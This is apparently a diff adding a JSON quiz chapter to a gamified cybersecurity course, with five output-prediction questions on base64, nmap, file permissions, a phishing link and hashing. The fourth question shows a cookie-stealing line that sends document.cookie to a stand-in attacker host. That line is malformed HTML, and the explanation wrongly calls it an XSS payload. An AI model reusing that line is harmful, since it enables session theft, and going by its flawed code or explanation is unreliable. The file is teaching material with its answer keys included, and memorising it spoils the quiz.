@@ -1,0 +1,70 @@
+{
+  "id": "sq_cyber_basics_2",
+  "title": "Traffic Whisperer 📡",
+  "triggerChapterIndex": 5,
+  "metadata": {
+    "type": "prediction"
+  },
+  "questions": [
+    {
+      "id": "sq_cyber_basics_2_q1",
+      "type": "code_output",
+      "question": "What is the expected output of this command found in a hacker's log?",
+      "codeSnippet": "echo 'SGVsbG8gQ3licm9u' | base64 --decode",
+      "correctOutput": "Hello Cybron",
+      "correctAnswer": "Hello Cybron",
+      "options": [],
+      "explanation": "The hacker is decoding a base64 string. Base64 is often used to mask payloads or simple messages.",
+      "xpReward": 25,
+      "difficulty": 1
+    },
+    {
+      "id": "sq_cyber_basics_2_q2",
+      "type": "code_output",
+      "question": "Predict the result of running this nmap scan on a local network for Port 80.",
+      "codeSnippet": "nmap -p 80 192.168.1.1\n# The target has a firewall dropping all HTTP traffic",
+      "correctOutput": "State: filtered",
+      "correctAnswer": "State: filtered",
+      "options": [],
+      "explanation": "If a firewall drops packets silently, nmap reports the state as 'filtered'.",
+      "xpReward": 30,
+      "difficulty": 2
+    },
+    {
+      "id": "sq_cyber_basics_2_q3",
+      "type": "code_output",
+      "question": "What is the result of using 'cat' on a file that you don't have 'read' permissions for?",
+      "codeSnippet": "ls -l secret.txt # Output: --w------- 1 root root ...\ncat secret.txt",
+      "correctOutput": "Permission denied",
+      "correctAnswer": "Permission denied",
+      "options": [],
+      "explanation": "The file only has 'write' permissions for the owner. Trying to read it results in a permission denied error.",
+      "xpReward": 20,
+      "difficulty": 2
+    },
+    {
+      "id": "sq_cyber_basics_2_q4",
+      "type": "code_output",
+      "question": "What happens if a user clicks this link in a phishing email?",
+      "codeSnippet": "<a href='http://evil-site.net/steal?cookie=' + document.cookie>Click here!</a>",
+      "correctOutput": "Cookie data is sent to the attacker's server",
+      "correctAnswer": "Cookie data is sent to the attacker's server",
+      "options": [],
+      "explanation": "This is a basic Cross-Site Scripting (XSS) payload that steals the session cookie and sends it to an external server.",
+      "xpReward": 35,
+      "difficulty": 3
+    },
+    {
+      "id": "sq_cyber_basics_2_q5",
+      "type": "code_output",
+      "question": "A user sends 'Message A'. The hash is '12345'. They then send 'Message B'. What can you predict about the new hash?",
+      "codeSnippet": "hash('Message A') = 12345\nhash('Message B') = ?",
+      "correctOutput": "A completely different random-looking value",
+      "correctAnswer": "A completely different random-looking value",
+      "options": [],
+      "explanation": "Hashing is designed to be chaotic. Even small changes in input (Avalanche Effect) result in totally different hashes.",
+      "xpReward": 25,
+      "difficulty": 2
+    }
+  ]
+}
